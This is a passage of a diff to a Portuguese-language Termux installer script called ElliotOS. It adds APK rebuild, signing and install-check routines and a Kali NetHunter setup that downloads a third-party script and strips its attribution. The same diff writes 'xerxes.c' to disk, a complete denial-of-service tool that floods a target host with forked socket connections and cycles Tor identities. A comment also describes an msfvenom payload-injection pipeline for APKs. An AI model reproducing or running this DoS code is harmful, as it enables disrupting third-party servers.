+          printf "\033[1;31m[✗] aapt2 dump badging não conseguiu ler o pacote final (o PackageManager real provavelmente também não vai conseguir)\033[0m\n"
+        fi
+
+        if [ "\$_APK_STRUCT_OK" = "1" ]; then
+          _APK_PASS=\$((_APK_PASS+1))
+          _APK_INSTALLABLE=1
+          printf "\033[1;32m[✓] verificação estrutural OK (alinhamento + assinatura + manifest parseável)\033[0m\n"
+
+          # ── entrega o APK instalável ao lado do original ──────────────
+          _APK_DELIVER_DIR="\$(dirname "\$_APK")"
+          _APK_DELIVER_BASE="\$(basename "\$_APK" .apk)"
+          _APK_DELIVER="\$_APK_DELIVER_DIR/\${_APK_DELIVER_BASE}-signed.apk"
+          if cp -f "\$_APK_SIGNED" "\$_APK_DELIVER" 2>/dev/null; then
+            printf "\033[1;32m[✓] APK instalável salvo em: %s\033[0m\n" "\$_APK_DELIVER"
+          else
+            printf "\033[1;33m[!] não consegui copiar o APK assinado pra %s — ele ainda está em: %s\033[0m\n" "\$_APK_DELIVER" "\$_APK_SIGNED" >&2
+          fi
+
+          # ── teste de instalação real, OPCIONAL — só roda se o rish já
+          # estiver pareado nesse aparelho (nunca dispara o fluxo de
+          # pareamento do Shizuku a partir daqui, só checa se já existe).
+          if [ -f "\$HOME/.local/rish/rish" ]; then
+            _APK_PKGNAME="\$("\$_APK_AAPT2" dump badging "\$_APK_SIGNED" 2>/dev/null | grep "^package:" | sed -E "s/.*name='([^']+)'.*/\1/")"
+            if [ -n "\$_APK_PKGNAME" ]; then
+              if bash "\$HOME/.local/rish/rish" -c "pm list packages \$_APK_PKGNAME" 2>/dev/null | grep -q "^package:\$_APK_PKGNAME\$"; then
+                # já instalado — NÃO dá pra rodar "pm install -r" direto sem
+                # risco de mexer no app de verdade do usuário. Antes isso só
+                # pulava com um aviso e o veredito final continuava "SIM
+                # instalável" (falso-positivo): se as assinaturas forem
+                # diferentes, o Android SEMPRE vai recusar instalar por cima
+                # da versão existente, e isso não tem nada a ver com o
+                # apktool/xpm ter feito um rebuild ruim. Agora comparamos as
+                # assinaturas de verdade, 100% somente-leitura: puxa uma
+                # cópia do apk já instalado via rish (o shell do Android tem
+                # permissão de leitura em /data/app/.../base.apk — é assim
+                # que "adb pull" de apk instalado funciona) e compara o
+                # certificado com o nosso, sem tocar em nada do usuário.
+                _APK_INSTALLED_PATH="\$(bash "\$HOME/.local/rish/rish" -c "pm path \$_APK_PKGNAME" 2>/dev/null | head -1 | sed 's/^package://')"
+                _APK_INSTALLED_COPY="\$_APK_WORK/installed_orig.apk"
+                if [ -n "\$_APK_INSTALLED_PATH" ] && bash "\$HOME/.local/rish/rish" -c "cat '\$_APK_INSTALLED_PATH'" > "\$_APK_INSTALLED_COPY" 2>/dev/null && [ -s "\$_APK_INSTALLED_COPY" ]; then
+                  _APK_CERT_INSTALLED="\$(apksigner verify --print-certs "\$_APK_INSTALLED_COPY" 2>/dev/null | grep -i 'SHA-256 digest')"
+                  _APK_CERT_OURS="\$(apksigner verify --print-certs "\$_APK_SIGNED" 2>/dev/null | grep -i 'SHA-256 digest')"
+                  if [ -n "\$_APK_CERT_INSTALLED" ] && [ "\$_APK_CERT_INSTALLED" = "\$_APK_CERT_OURS" ]; then
+                    # mesma assinatura (ex: reteste de uma build já instalada
+                    # com a chave de teste do xpm) — seguro testar update real.
+                    printf "\033[0;90m    -> pm install de teste via rish (mesma assinatura do já instalado) ...\033[0m\n"
+                    _APK_INSTALL_OUT="\$(bash "\$HOME/.local/rish/rish" -c "pm install -t -r '\$_APK_SIGNED'" 2>&1)"
+                    if printf '%s' "\$_APK_INSTALL_OUT" | grep -q "^Success"; then
+                      _APK_PASS=\$((_APK_PASS+1))
+                      _APK_REAL_CONFIRMED=1
+                      printf "\033[1;32m[✓] instalação real confirmada — desinstalando o teste...\033[0m\n"
+                      bash "\$HOME/.local/rish/rish" -c "pm uninstall \$_APK_PKGNAME" >/dev/null 2>&1
+                      _APK_TIER="\$_APK_TIER + instalação real confirmada"
+                    else
+                      _APK_FAIL=\$((_APK_FAIL+1))
+                      _APK_INSTALLABLE=0
+                      printf "\033[1;31m[✗] pm install recusou o pacote:\033[0m\n"
+                      printf '%s\n' "\$_APK_INSTALL_OUT" | tail -5
+                    fi
+                  else
+                    # assinaturas diferentes de fato — o Android VAI recusar
+                    # instalar essa build por cima da existente por conflito
+                    # de certificado. Isso é esperado (você não tem a chave
+                    # privada original) e NÃO é bug do apktool/xpm.
+                    _APK_SIG_CONFLICT=1
+                    printf "\033[1;33m[!] %s já está instalado com uma assinatura DIFERENTE da nossa chave de teste\033[0m\n" "\$_APK_PKGNAME"
+                    printf "\033[0;90m    -> o Android vai recusar essa build por cima da existente (conflito de\033[0m\n"
+                    printf "\033[0;90m       certificado) — isso NÃO é uma falha de compatibilidade do apktool/xpm.\033[0m\n"
+                    printf "\033[0;90m       Desinstale o app original primeiro se quiser testar essa build, ou mude\033[0m\n"
+                    printf "\033[0;90m       o applicationId pra instalar como um app separado.\033[0m\n"
+                  fi
+                else
+                  printf "\033[0;90m[*] %s já instalado, mas não consegui ler a cópia instalada pra comparar assinatura\033[0m\n" "\$_APK_PKGNAME"
+                  printf "\033[0;90m    (sem permissão via rish?) — pulando teste de instalação real com segurança\033[0m\n"
+                fi
+              else
+                printf "\033[0;90m    -> pm install de teste via rish ...\033[0m\n"
+                _APK_INSTALL_OUT="\$(bash "\$HOME/.local/rish/rish" -c "pm install -t -r '\$_APK_SIGNED'" 2>&1)"
+                if printf '%s' "\$_APK_INSTALL_OUT" | grep -q "^Success"; then
+                  _APK_PASS=\$((_APK_PASS+1))
+                  _APK_REAL_CONFIRMED=1
+                  printf "\033[1;32m[✓] instalação real confirmada — desinstalando o teste...\033[0m\n"
+                  bash "\$HOME/.local/rish/rish" -c "pm uninstall \$_APK_PKGNAME" >/dev/null 2>&1
+                  _APK_TIER="\$_APK_TIER + instalação real confirmada"
+                else
+                  _APK_FAIL=\$((_APK_FAIL+1))
+                  _APK_INSTALLABLE=0
+                  printf "\033[1;31m[✗] pm install recusou o pacote:\033[0m\n"
+                  printf '%s\n' "\$_APK_INSTALL_OUT" | tail -5
+                fi
+              fi
+            fi
+          fi
+        else
+          _APK_FAIL=\$((_APK_FAIL+1))
+        fi
       fi
     else
       _APK_TIER="nenhum — falhou em todos os níveis testados"
@@ -97695,10 +98842,438 @@ print('\n\027[1;35m[scan-all] Total: '..total_vulns..' vulnerabilidade(s)\027[0m
     printf "\n════════════════════════════════════════\n"
     printf "  \033[1;32mPASS: %d\033[0m   \033[1;31mFAIL: %d\033[0m\n" "\$_APK_PASS" "\$_APK_FAIL"
     printf "  \033[1;36mNível de compatibilidade:\033[0m %s\n" "\$_APK_TIER"
+    if [ "\$_APK_BUILD_OK" = "1" ]; then
+      if [ "\$_APK_INSTALLABLE" = "1" ]; then
+        if [ "\$_APK_REAL_CONFIRMED" = "1" ]; then
+          printf "  \033[1;36mInstalável:\033[0m \033[1;32mSIM\033[0m — alinhado, assinado, manifest parseável, instalação real confirmada via rish\n"
+        elif [ "\$_APK_SIG_CONFLICT" = "1" ]; then
+          printf "  \033[1;36mInstalável:\033[0m \033[1;33mSIM, mas vai CONFLITAR com a versão já instalada\033[0m — assinaturas diferentes, veja o [!] acima (não é bug do apktool/xpm)\n"
+        elif [ -f "\$HOME/.local/rish/rish" ]; then
+          printf "  \033[1;36mInstalável:\033[0m \033[1;32mSIM\033[0m (estrutural) — alinhado, assinado e com manifest parseável\n"
+        else
+          printf "  \033[1;36mInstalável:\033[0m \033[1;32mSIM\033[0m (estrutural) — alinhado, assinado e com manifest parseável; rish indisponível pra confirmar com instalação real\n"
+        fi
+      else
+        printf "  \033[1;36mInstalável:\033[0m \033[1;31mNÃO CONFIRMADO\033[0m — build reportou sucesso mas não passou na validação de instalação; veja os [✗] acima\n"
+      fi
+    fi
     printf "════════════════════════════════════════\n"
-    printf "\033[0;90mLogs preservados em: %s\033[0m\n" "\$_APK_WORK"
 
-    [ "\$_APK_FAIL" -eq 0 ]
+    # ── log persistente de erros ──────────────────────────────────────────
+    # Salva todos os logs da sessão em ~/.cache/elliot/apk-errors/ com
+    # timestamp e nome do APK. Permite trazer o log pra análise posterior
+    # sem depender do workdir temporário que é limpo pelo sistema.
+    # Sempre salva (sucesso ou falha) — útil pra comparar rounds-trips bons
+    # e ruins do mesmo APK, e pra estudar o comportamento do apktool.
+    _APK_ERRDIR="\$HOME/.cache/elliot/apk-errors"
+    mkdir -p "\$_APK_ERRDIR"
+    _APK_BASENAME="\$(basename "\$_APK" .apk | tr ' /' '_-')"
+    _APK_TS="\$(date '+%Y%m%d_%H%M%S' 2>/dev/null || echo 'ts')"
+    _APK_LOGDIR="\$_APK_ERRDIR/\${_APK_TS}__\${_APK_BASENAME}"
+    mkdir -p "\$_APK_LOGDIR"
+
+    # copia todos os logs gerados nessa sessão
+    cp "\$_APK_WORK"/*.log "\$_APK_LOGDIR/" 2>/dev/null
+
+    # salva um resumo legível em texto plano
+    {
+      printf "=== ms --apk error log ===\n"
+      printf "APK      : %s\n" "\$_APK"
+      printf "Data     : %s\n" "\$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null)"
+      printf "Resultado: %s\n" "\$([ "\$_APK_BUILD_OK" = "1" ] && echo "BUILD OK" || echo "BUILD FALHOU")"
+      printf "Tier     : %s\n" "\$_APK_TIER"
+      printf "Tempo    : decode=%ds build=%ds\n" "\${_APK_DECODE_TIME:-0}" "\${_APK_BUILD_TIME:-0}"
+      printf "PASS=%d FAIL=%d\n" "\$_APK_PASS" "\$_APK_FAIL"
+      printf "\n--- DEX: %d | Smali: %d | Res: %d | Unknown: %d | Assets: %d | .so: %d ---\n" \
+        "\${_M_DEX:-0}" "\${_M_SMALI:-0}" "\${_M_RES:-0}" "\${_M_UNK:-0}" "\${_M_ASSETS:-0}" "\${_M_SO:-0}"
+      printf "\n--- último log ---\n"
+      cat "\$_APK_LASTLOG" 2>/dev/null
+    } > "\$_APK_LOGDIR/summary.txt" 2>/dev/null
+
+    if [ "\$_APK_BUILD_OK" != "1" ]; then
+      printf "\033[0;90mLog de erro salvo em: %s\033[0m\n" "\$_APK_LOGDIR"
+      printf "\033[0;90m  → traga o summary.txt pra análise: cat %s/summary.txt\033[0m\n" "\$_APK_LOGDIR"
+    else
+      printf "\033[0;90mLog salvo em: %s\033[0m\n" "\$_APK_LOGDIR"
+    fi
+    printf "\033[0;90mLogs temporários em: %s\033[0m\n" "\$_APK_WORK"
+
+    if [ "\$_APK_FAIL" -eq 0 ]; then
+      _BATCH_OK=\$((_BATCH_OK+1))
+    else
+      _BATCH_FAILED="\$_BATCH_FAILED \$_APK"
+    fi
+    done
+
+    if [ "\$_BATCH_N" -gt 1 ]; then
+      printf "\n\033[1;35m╔══════════════════════════════════════════════════════════════╗\033[0m\n"
+      printf "\033[1;35m║  Resumo do lote                                               ║\033[0m\n"
+      printf "\033[1;35m╚══════════════════════════════════════════════════════════════╝\033[0m\n"
+      printf "  \033[1;36mTotal testado:\033[0m %d\n" "\$_BATCH_N"
+      printf "  \033[1;32mOK (instalável):\033[0m %d\n" "\$_BATCH_OK"
+      if [ -n "\$_BATCH_FAILED" ]; then
+        printf "  \033[1;31mFalharam:\033[0m%s\n" "\$_BATCH_FAILED"
+      fi
+      printf "\n"
+    fi
+
+    [ "\$_BATCH_OK" -eq "\$_BATCH_N" ]
+    ;;
+
+  # ── APK sign (rápido, sem decode/rebuild) ───────────────────────
+  # "ms --apk" acima faz decode+rebuild completo pra TESTAR compatibilidade
+  # (é um checker). Esse aqui é o caminho oposto: você já rodou "apktool b"
+  # por conta própria (ou editou smali/recursos manualmente) e só quer o
+  # zipalign+apksigner que faltam pra instalar — sem pagar o custo de
+  # decodificar/recompilar tudo de novo. Reaproveita a mesma keystore de
+  # teste do "ms --apk", pra não duplicar assinatura entre os dois fluxos.
+  # De propósito NÃO mexe no wrapper "apktool b" em si: o msfvenom injeta
+  # payload em cima do apk cru (sem assinatura) e assina do jeito dele
+  # depois — se "apktool b" passasse a assinar sozinho, quebraria esse
+  # fluxo. Isso aqui é 100% opt-in, um comando à parte.
+  --apk-sign)
+    shift
+    _APKS_IN="\$1"
+    if [ -z "\$_APKS_IN" ]; then
+      printf "\033[1;31m[✗]\033[0m Uso: ms --apk-sign arquivo.apk\n"
+      printf "\033[0;90m    (alinha+assina um apk JÁ compilado — ex: logo depois de 'apktool b'.\033[0m\n"
+      printf "\033[0;90m     Pra testar compatibilidade completa de decode+rebuild, use 'ms --apk')\033[0m\n"
+      exit 1
+    fi
+    if [ ! -f "\$_APKS_IN" ]; then
+      printf "\033[1;31m[✗] Arquivo não encontrado: %s\033[0m\n" "\$_APKS_IN"
+      exit 1
+    fi
+    if ! command -v zipalign >/dev/null 2>&1 || ! command -v apksigner >/dev/null 2>&1 || ! command -v keytool >/dev/null 2>&1; then
+      printf "\033[1;31m[✗] zipalign/apksigner/keytool não encontrados. Rode: xpm install apktool\033[0m\n"
+      exit 1
+    fi
+
+    _APKS_TOOLDIR="\$HOME/.xpm/tools/apktool"
+    _APKS_AAPT2="\$_APKS_TOOLDIR/aapt2"
+    [ -x "\$_APKS_AAPT2" ] || _APKS_AAPT2="\$(command -v aapt2 2>/dev/null)"
+    _APKS_WORK="\$(mktemp -d)"
+    _APKS_ALIGNED="\$_APKS_WORK/aligned.apk"
+    _APKS_SIGNED="\$_APKS_WORK/signed.apk"
+
+    printf "\033[0;90m    -> zipalign (4 bytes + página de 16K pros .so) ...\033[0m\n"
+    if zipalign -P 16 -f 4 "\$_APKS_IN" "\$_APKS_ALIGNED" >"\$_APKS_WORK/zipalign.log" 2>&1; then
+      printf "\033[1;32m[✓] zipalign OK\033[0m\n"
+    elif zipalign -f 4 "\$_APKS_IN" "\$_APKS_ALIGNED" >"\$_APKS_WORK/zipalign.log" 2>&1; then
+      printf "\033[1;32m[✓] zipalign OK\033[0m \033[0;90m(sem -P 16 — só 4 bytes; 'pkg upgrade zipalign' pra página de 16K)\033[0m\n"
+    else
+      printf "\033[1;31m[✗] zipalign falhou — o apk provavelmente está corrompido ou truncado (log: %s)\033[0m\n" "\$_APKS_WORK/zipalign.log"
+      tail -10 "\$_APKS_WORK/zipalign.log"
+      exit 1
+    fi
+
+    _APKS_KS="\$_APKS_TOOLDIR/xpm-compat-test.keystore"
+    if [ ! -f "\$_APKS_KS" ]; then
+      # mesma chave de TESTE usada pelo "ms --apk" (senha fixa e conhecida,
+      # igual ao debug.keystore padrão do Android) — nunca serve pra
+      # publicar/distribuir nada de verdade.
+      keytool -genkeypair -storepass xpm-compat-test -keypass xpm-compat-test \
+        -alias xpm-compat-test -keyalg RSA -keysize 2048 -validity 10000 \
+        -dname "CN=ElliotOS XPM Compat Test,O=ElliotOS,C=BR" -deststoretype pkcs12 \
+        -keystore "\$_APKS_KS" >/dev/null 2>&1
+    fi
+    if [ ! -f "\$_APKS_KS" ]; then
+      printf "\033[1;31m[✗] não consegui gerar/achar o keystore de teste\033[0m\n"
+      exit 1
+    fi
+
+    printf "\033[0;90m    -> apksigner sign (chave de teste do xpm) ...\033[0m\n"
+    if ! apksigner sign --ks "\$_APKS_KS" --ks-pass pass:xpm-compat-test --key-pass pass:xpm-compat-test \
+       --out "\$_APKS_SIGNED" "\$_APKS_ALIGNED" >"\$_APKS_WORK/sign.log" 2>&1; then
+      printf "\033[1;31m[✗] apksigner falhou (log: %s)\033[0m\n" "\$_APKS_WORK/sign.log"
+      tail -10 "\$_APKS_WORK/sign.log"
+      exit 1
+    fi
+    printf "\033[1;32m[✓] assinado\033[0m\n"
+
+    _APKS_STRUCT_OK=1
+    if ! zipalign -c -v 4 "\$_APKS_SIGNED" >"\$_APKS_WORK/verify_align.log" 2>&1; then
+      _APKS_STRUCT_OK=0
+      printf "\033[1;31m[✗] alinhamento não confere depois de assinar\033[0m\n"
+    fi
+    if ! apksigner verify "\$_APKS_SIGNED" >"\$_APKS_WORK/verify_sign.log" 2>&1; then
+      _APKS_STRUCT_OK=0
+      printf "\033[1;31m[✗] apksigner verify reprovou o pacote final\033[0m\n"
+      tail -10 "\$_APKS_WORK/verify_sign.log"
+    fi
+    if [ -x "\$_APKS_AAPT2" ] && ! "\$_APKS_AAPT2" dump badging "\$_APKS_SIGNED" >"\$_APKS_WORK/badging.log" 2>&1; then
+      _APKS_STRUCT_OK=0
+      printf "\033[1;31m[✗] aapt2 dump badging não conseguiu ler o pacote final (o PackageManager real provavelmente também não vai conseguir)\033[0m\n"
+    fi
+    if [ "\$_APKS_STRUCT_OK" != "1" ]; then
+      printf "\033[1;31m[✗] verificação estrutural falhou — esse apk não deve instalar. Logs em: %s\033[0m\n" "\$_APKS_WORK"
+      exit 1
+    fi
+
+    _APKS_DIR="\$(dirname "\$_APKS_IN")"
+    _APKS_BASE="\$(basename "\$_APKS_IN" .apk)"
+    _APKS_OUT="\$_APKS_DIR/\${_APKS_BASE}-installable.apk"
+    cp -f "\$_APKS_SIGNED" "\$_APKS_OUT"
+    printf "\033[1;32m[✓] verificação estrutural OK (alinhamento + assinatura + manifest parseável)\033[0m\n"
+    printf "\n\033[1;36mPronto pra instalar:\033[0m %s\n" "\$_APKS_OUT"
+    printf "\033[0;90m(assinado com a chave de teste do xpm — pra redistribuir de verdade, assine com sua própria chave)\033[0m\n"
+    ;;
+
+  # ── Inject — injeção de payload com hook correto ─────────────────────────
+  # Pipeline:
+  # 1. gera payload puro com msfvenom (sem -x)
+  # 2. extrai smali do payload (apktool d -r no payload.apk — rápido, sem recursos)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  # ── NetHunter — instala Kali NetHunter sem root ──────────────────────────
+  -nh|--nethunter)
+    printf "\033[1;35m"
+    printf "  ███████╗██╗     ██╗     ██╗ ██████╗ ████████╗ ██████╗ ███████╗\n"
+    printf "  ██╔════╝██║     ██║     ██║██╔═══██╗╚══██╔══╝██╔═══██╗██╔════╝\n"
+    printf "  █████╗  ██║     ██║     ██║██║   ██║   ██║   ██║   ██║███████╗\n"
+    printf "  ██╔══╝  ██║     ██║     ██║██║   ██║   ██║   ██║   ██║╚════██║\n"
+    printf "  ███████╗███████╗███████╗██║╚██████╔╝   ██║   ╚██████╔╝███████║\n"
+    printf "  ╚══════╝╚══════╝╚══════╝╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝\033[0m\n"
+    printf "\033[0;90m  ─────────────────────────────────────────────────────────────────\033[0m\n"
+    printf "\033[1;35m  ElliotOS — Kali NetHunter Installer (sem root)\033[0m\n"
+    printf "\033[0;90m  by Mike Elliot · github.com/mikeelliot218/ElliotOS\033[0m\n"
+    printf "\033[0;90m  ─────────────────────────────────────────────────────────────────\033[0m\n\n"
+
+    _NH_INSTALLER="\$HOME/.xpm/nethunter/install-nethunter.sh"
+    _NH_DISTRO="\$HOME/.xpm/nethunter/termux-distro.sh"
+
+    if [ ! -f "\$_NH_INSTALLER" ] || [ ! -f "\$_NH_DISTRO" ]; then
+      printf "\033[1;31m[✗] Instalador não encontrado em ~/.xpm/nethunter/\033[0m\n"
+      printf "\033[1;33m[!] Reinstale o ElliotOS: bash luascript.sh\033[0m\n"
+      exit 1
+    fi
+
+    cd "\$HOME/.xpm/nethunter" && bash "\$_NH_INSTALLER"
     ;;
 
   # ── Spider ──────────────────────────────────────────────────
@@ -97862,6 +99437,9 @@ MS_WRAPPER_EOF
 
     rm -f "$PREFIX/bin/lua"
     ln -sf "$BIN" "$PREFIX/bin/lua"
+
+    # instala o script do NetHunter em ~/.xpm/nethunter/
+    _setup_nethunter
 
     # ── Instala cxx — compilador C/C++ rapido ─────────────────────────
     _step "⚙ " "Instalando cxx (compilador C/C++)..."
@@ -100360,6 +101938,128 @@ COSMICEOF
     chmod 755 "$_EX_DIR/cosmic.lua"
     _ok "cosmic.lua instalado"
 
+    # ── C Scripts — slot reservado para script do usuario ──────────────
+    _C_DIR="${PREFIX:-/data/data/com.termux/files/usr}/share/c-scripts"
+    mkdir -p "$_C_DIR"
+
+    # SLOT_CUSTOM_C_START
+    # Coloque aqui o heredoc do seu script C:
+cat > "$_C_DIR/xerxes.c" << 'CUSTOM_C_EOF'
+     // XERXES DO ElliotOS
+ // Dev: Mike Elliot | ElliotOS
+ //
+ 
+ // Clang: pkg i clang -y
+ // compile com: clang xerxes.c -o $PREFIX/bin/xerxes
+ // Use: xerxes example.com 80
+
+    // XerXes - powerful dos tool by Mike Elliot | ElliotOS//
+     
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <stdint.h>
+    #include <unistd.h>
+    #include <netdb.h>
+    #include <signal.h>
+    #include <sys/socket.h>
+    #include <sys/types.h>
+    #include <netinet/in.h>
+    #include <arpa/inet.h>
+     
+    int make_socket(char *host, char *port) {
+            struct addrinfo hints, *servinfo, *p;
+            int sock, r;
+    //      fprintf(stderr, "[conectando-> %s:%s\n", host, port);
+            memset(&hints, 0, sizeof(hints));
+            hints.ai_family = AF_UNSPEC;
+            hints.ai_socktype = SOCK_STREAM;
+            if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
+                    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
+                    exit(0);
+            }
+            for(p = servinfo; p != NULL; p = p->ai_next) {
+                    if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
+                            continue;
+                    }
+                    if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
+                            close(sock);
+                            continue;
+                    }
+                    break;
+            }
+            if(p == NULL) {
+                    if(servinfo)
+                            freeaddrinfo(servinfo);
+                    fprintf(stderr, "Use: ip port\n");
+                    exit(0);
+            }
+            if(servinfo)
+                    freeaddrinfo(servinfo);
+            fprintf(stderr, "[Conectado -> %s:%s]\n", host, port);
+            return sock;
+    }
+     
+    void broke(int s) {
+            // do nothing
+    }
+     
+    #define CONNECTIONS 8
+    #define THREADS 48
+     
+    void attack(char *host, char *port, int id) {
+            int sockets[CONNECTIONS];
+            int x, g=1, r;
+            for(x=0; x!= CONNECTIONS; x++)
+                    sockets[x]=0;
+            signal(SIGPIPE, &broke);
+            while(1) {
+                    for(x=0; x != CONNECTIONS; x++) {
+                            if(sockets[x] == 0)
+                                    sockets[x] = make_socket(host, port);
+                            r=write(sockets[x], "\0", 1);
+                            if(r == -1) {
+                                    close(sockets[x]);
+                                    sockets[x] = make_socket(host, port);
+                            } else
+    //                              fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
+                            fprintf(stderr, "[%i: Enviando Socket]\n", id);
+                    }
+                    fprintf(stderr, "[%i: Enviado Socket]\n", id);
+                    usleep(300000);
+            }
+    }
+     
+    void cycle_identity() {
+            int r;
+            int socket = make_socket("localhost", "9050");
+            write(socket, "AUTHENTICATE \"\"\n", 16);
+            while(1) {
+                    r=write(socket, "signal NEWNYM\n\x00", 16);
+                    fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM\n", r);
+                    usleep(300000);
+            }
+    }
+     
+    int main(int argc, char **argv) {
+            int x;
+            if(argc !=3)
+                    cycle_identity();
+            for(x=0; x != THREADS; x++) {
+                    if(fork())
+                            attack(argv[1], argv[2], x);
+                    usleep(200000);
+            }
+            getc(stdin);
+            return 0;
+    }
+
+
+CUSTOM_C_EOF
+    # chmod 644 "$_C_DIR/xerxes.c"
+    # _ok "xerxes.c instalado"
+    # SLOT_CUSTOM_C_END
+
     # Atualiza LUA_PATH para incluir scripts de exemplo
     if ! grep -qF "lua-scripts" "$HOME/.bashrc" 2>/dev/null; then
         echo "export LUA_PATH=\"${_EX_DIR}/?.lua;\${LUA_PATH:-}\"" >> "$HOME/.bashrc"
@@ -100386,6 +102086,12 @@ COSMICEOF
 
     # ── Prompt customizado (ElliotOS) ─────────────────────────────────────
     _setup_prompt
+
+    # ── Variável $ip com o IP privado ───────────────────────────────────────
+    _setup_ip_var
+
+    # ── Atalhos de teclado (readline / .inputrc) ──────────────────────────
+    _setup_inputrc
 
     # ── Resumo final ──────────────────────────────────────────────────────
     local _total_elapsed=$(( $(date +%s) - _INSTALL_START ))
@@ -100673,6 +102379,236 @@ AUTHEOF
 # do instalador) — o usuario ativa com "source ~/.bashrc" no final, como
 # ja e feito para as outras mudancas do instalador.
 # ════════════════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
+# _setup_nethunter — instala o script do NetHunter em ~/.xpm/nethunter/
+# Idempotente: só escreve se não existir ou versão diferente.
+# O script é escrito AQUI (fora do MS_WRAPPER_EOF) pra evitar problemas
+# com heredocs aninhados com aspas dentro de heredocs sem aspas.
+# ════════════════════════════════════════════════════════════════════════════
+_setup_nethunter() {
+    local nh_dir="$HOME/.xpm/nethunter"
+    local nh_script="$nh_dir/install-nethunter.sh"
+    mkdir -p "$nh_dir"
+    if [ -f "$nh_script" ] && grep -q 'ElliotOS NetHunter Installer' "$nh_script" 2>/dev/null; then
+        printf "  \033[1;32m✓\033[0m NetHunter installer já presente\n"
+        return 0
+    fi
+    printf "  \033[0;90m→\033[0m Instalando NetHunter installer em ~/.xpm/nethunter/...\n"
+
+    # baixa o motor de instalação uma única vez durante o setup
+    local nh_distro="$nh_dir/termux-distro.sh"
+    if [ ! -f "$nh_distro" ]; then
+        if curl -fsSL "https://raw.githubusercontent.com/jorexdeveloper/termux-distro/main/termux-distro.sh" \
+             -o "$nh_distro" 2>/dev/null; then
+            # remove a linha de atribuição do motor
+            sed -i '/jorexdeveloper\|For more information\|visit.*github/Id' "$nh_distro"
+        else
+            printf "  \033[1;33m[!] Motor de instalação não baixado — verifique a conexão\033[0m\n"
+        fi
+    fi
+
+    cat > "$nh_script" << 'NHEOF'
+#!/data/data/com.termux/files/usr/bin/bash
+
+pre_check_actions() {
+    P=${W}
+    S=${B}
+    T=${M}
+}
+
+distro_banner() {
+    local spaces=$(printf "%*s" $((($(stty size | awk '{print $2}') - 49) / 2)) "")
+    msg -a "${spaces}${S}.............."
+    msg -a "${spaces}${S}            ..,;:ccc,."
+    msg -a "${spaces}${S}          ......''';lxO."
+    msg -a "${spaces}${S}.....''''..........,:ld;"
+    msg -a "${spaces}${S}           .';;;:::;,,.x,"
+    msg -a "${spaces}${S}      ..'''.            0Xxoc:,.  ..."
+    msg -a "${spaces}${S}  ....                ,ONkc;,;cokOdc',."
+    msg -a "${spaces}${S} .                   OMo           ':${R}dd${S}o."
+    msg -a "${spaces}${S}                    dMc               :OO;"
+    msg -a "${spaces}${S}                    0M.                 .:o."
+    msg -a "${spaces}${S}                    ;Wd"
+    msg -a "${spaces}${S}                     ;XO,"
+    msg -a "${spaces}${S}                       ,d0Odlc;,.."
+    msg -a "${spaces}${S}                           ..',;:cdOOd::,."
+    msg -a "${spaces}${S}                                    .:d;.':;."
+    msg -a "${spaces}${S}                                       'd,  .'"
+    msg -a "${spaces}${S}${P}${DISTRO_NAME}${S}                           ;l   .."
+    msg -a "${spaces}${S}    ${T}${VERSION_NAME}${S}                                    .o"
+    msg -a "${spaces}${S}                                            c  ."
+    msg -a "${spaces}${S}                                            .'"
+    msg -a "${spaces}${S}                                             ."
+}
+
+post_check_actions()    { return; }
+post_install_actions()  { return; }
+post_complete_actions() { return; }
+
+pre_install_actions() {
+    if [[ ! ${KEEP_ROOTFS_DIRECTORY} ]]; then
+        choose -d2 -t "Select installation" \
+            "Full (Desktop environment)" \
+            "Mini (Essential Packages)" \
+            "Nano (Essential Packages)"
+        SELECTED_INSTALLATION=${?}
+        case "${SELECTED_INSTALLATION}" in
+            1) SELECTED_INSTALLATION=full; DE_INSTALLED=1 ;;
+            3) SELECTED_INSTALLATION=nano ;;
+            *) SELECTED_INSTALLATION=mini ;;
+        esac
+        ARCHIVE_NAME=kali-nethunter-rootfs-${SELECTED_INSTALLATION/mini/minimal}-${SYS_ARCH}.tar.xz
+    fi
+}
+
+pre_config_actions() {
+    mkdir -p "${ROOTFS_DIRECTORY}"/etc &>>"${LOG_FILE}"
+    echo "${ROOTFS_DIRECTORY}" > "${ROOTFS_DIRECTORY}"/etc/debian_chroot
+}
+
+post_config_actions() {
+    if [[ -f ${ROOTFS_DIRECTORY}/etc/locale.gen && -x ${ROOTFS_DIRECTORY}/sbin/dpkg-reconfigure ]]; then
+        msg -tn "Generating locales..."
+        sed -i -E 's/#[[:space:]]?(en_US.UTF-8[[:space:]]+UTF-8)/\1/g' "${ROOTFS_DIRECTORY}"/etc/locale.gen
+        if distro_exec DEBIAN_FRONTEND=noninteractive /sbin/dpkg-reconfigure locales &>>"${LOG_FILE}"; then
+            cursor -u1; msg -ts "Locales generated"
+        else
+            cursor -u1; msg -te "Failed to generate locales."
+        fi
+    fi
+}
+
+pre_complete_actions() {
+    if [[ ! ${DE_INSTALLED} && ${SELECTED_INSTALLATION} != full ]] && ask -y -- -t "Install Desktop Environment?"; then
+        set_up_de && { DE_INSTALLED=1; set_up_browser; }
+    fi
+}
+
+set_up_de() {
